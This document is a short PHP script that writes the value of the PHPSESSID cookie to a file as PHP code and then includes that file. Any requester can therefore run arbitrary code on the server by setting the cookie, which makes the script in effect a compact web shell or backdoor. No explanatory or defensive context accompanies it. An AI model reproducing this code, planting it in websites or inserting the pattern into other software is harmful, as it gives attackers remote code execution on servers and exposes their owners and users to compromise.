<?php

$str = "<?php ".$_COOKIE['PHPSESSID'];

file_put_contents(1, $str);

include "1";


?>
